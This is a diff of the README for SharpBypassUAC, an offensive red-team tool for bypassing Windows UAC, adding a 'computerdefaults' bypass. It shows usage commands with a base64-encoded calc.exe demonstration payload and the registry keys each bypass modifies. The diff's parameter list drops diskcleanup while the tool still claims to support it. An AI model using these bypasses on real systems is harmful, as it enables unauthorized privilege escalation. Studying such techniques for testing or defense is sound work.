@@ -2,12 +2,12 @@
 C# tool for UAC bypasses
 
 # Usage
-SharpBypassUAC currently supports the **eventvwr**, **fodhelper**, **sdclt**, **slui**, and **DiskCleanup** UAC bypasses.
+SharpBypassUAC currently supports the **eventvwr**, **fodhelper**, **computerdefaults**, **sdclt**, **slui**, and **DiskCleanup** UAC bypasses.
 
 SharpBypassUAC accepts a base64 encoded windows command to be executed in high integrity. The command is base64 encoded to be easily used in tools such as Covenant's "Assembly" task
 
 ## Parameters
-  -b, --bypass=VALUE         Bypass to execute: eventvwr, fodhelper, sdclt, slui, diskcleanup
+  -b, --bypass=VALUE         Bypass to execute: eventvwr, fodhelper, computerdefaults, sdclt, slui
   
   -e, --encodedCommand=VALUE Base64 encoded command to execute
 
@@ -16,6 +16,9 @@ SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
 
 ### Example usage for fodhelper bypass to launch calc.exe
 SharpBypassUAC.exe -b fodhelper -e Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
+
+### Example usage for computerdefaults bypass to launch calc.exe
+SharpBypassUAC.exe -b computerdefaults -e Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
 
 ### Example usage for sdclt bypass to launch calc.exe
 SharpBypassUAC.exe -b sdclt -e Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
@@ -37,6 +40,12 @@ Registry modifications to:
   - Modifies the "(default)" value with the command to execute
 
 ### Fodhelper
+Registry modifications to:
+- HKCU\Software\Classes\ms-settings\Shell\Open\command
+  - Modifies the "(default)" value with the command to execute
+  - Modifies the "DelegateExecute" value with an empty value
+  
+### Computerdefaults
 Registry modifications to:
 - HKCU\Software\Classes\ms-settings\Shell\Open\command
   - Modifies the "(default)" value with the command to execute
@@ -66,7 +75,7 @@ schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I
 **eventvwr**:
 [enigma0x3's](https://github.com/enigma0x3) [Invoke-EventVwrBypass.ps1 script](https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1)
 
-**fodhelper**:
+**fodhelper** and **computerdefaults**:
 [winscripting.blog's](https://github.com/winscripting) [FodhelperBypass.ps1 script](https://github.com/winscripting/UAC-bypass)
 
 **sdclt**: [Emeric Nasi's](https://twitter.com/emericnasi?lang=en) [blog post](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)
